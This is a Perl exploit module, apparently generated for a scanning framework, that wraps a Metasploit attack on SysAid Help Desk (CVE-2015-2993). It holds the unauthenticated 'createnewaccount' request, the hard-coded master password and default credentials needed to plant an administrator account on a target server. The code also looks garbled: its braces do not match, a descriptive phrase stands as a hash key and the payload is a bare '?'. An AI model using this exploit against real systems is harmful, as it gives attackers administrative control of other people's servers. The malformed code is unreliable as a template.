package SYSAID::MSF::SysaidAdminAcct;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "SysaidAdminAcct";

   my $DETECTION = {

   };

my $EXPLOIT = {
  "CVE" => "CVE-2015-2993",
  "DESCRIPTION" => "

        This module exploits a vulnerability in SysAid Help Desk that allows an unauthenticated

        user to create an administrator account. Note that this exploit will only work once. Any

        subsequent attempts will fail. On the other hand, the credentials must be verified

        manually. This module has been tested on SysAid 14.4 in Windows and Linux.

        ",
  "METHOD" => "GET",
  "MSF_MODULE" => "sysaid_admin_acct",
  "PATH" => "accountID=__ACCOUNTID__&organizationName=__ORGANIZATIONNAME__&userName=__USERNAME__&password=__PASSWORD__&masterPassword=master123&",
  "PATHS" => ["createnewaccount"],
  "PAYLOAD" => "?",
  "REFERENCES" => [
    "http://seclists.org/fulldisclosure/2015/Jun/8",
    "https://github.com/pedrib/PoC/blob/master/advisories/sysaid-14.4-multiple-vulns.txt",
  ],
  "THE USERTITLE FOR THE NEW ADMIN ACCOUNT" => "msf",
  "TITLE" => "SysAid Help Desk Administrator Account Creation",
  VARIABLES => {
    'ACCOUNTID' =>       { DESCRIPTION => "", VALUE => "" },
    'PASSWORD' =>       {
  DESCRIPTION => "The password for the new admin account",
  VALUE => "password",
},
    'TARGETURI' =>       { DESCRIPTION => "", VALUE => "" },
    'USERNAME' =>       { DESCRIPTION => "", VALUE => "" },
    'ORGANIZATIONNAME' =>       { DESCRIPTION => "", VALUE => "" },
  },
      },  VALIDATION => {
    'TSTRING' =>       "Error while creating account",

  TYPE => 'MSF',
  PLATFORM => 'ALL',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
